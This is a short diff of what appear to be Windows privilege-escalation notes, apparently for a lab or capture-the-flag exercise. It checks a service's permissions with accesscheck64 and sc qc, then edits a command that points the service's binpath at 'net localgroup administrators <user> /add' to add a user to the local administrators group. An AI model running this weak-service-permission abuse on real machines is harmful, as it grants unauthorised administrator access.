@@ -14,5 +14,5 @@ accesscheck64.exe -uwcv daclsvc
 sc qc daclsv
 ```
 ```
-sc config daclsvc binpath= "net localgroup administrators /add"
+sc config daclsvc binpath= "net localgroup administrators <user> /add"
 ```
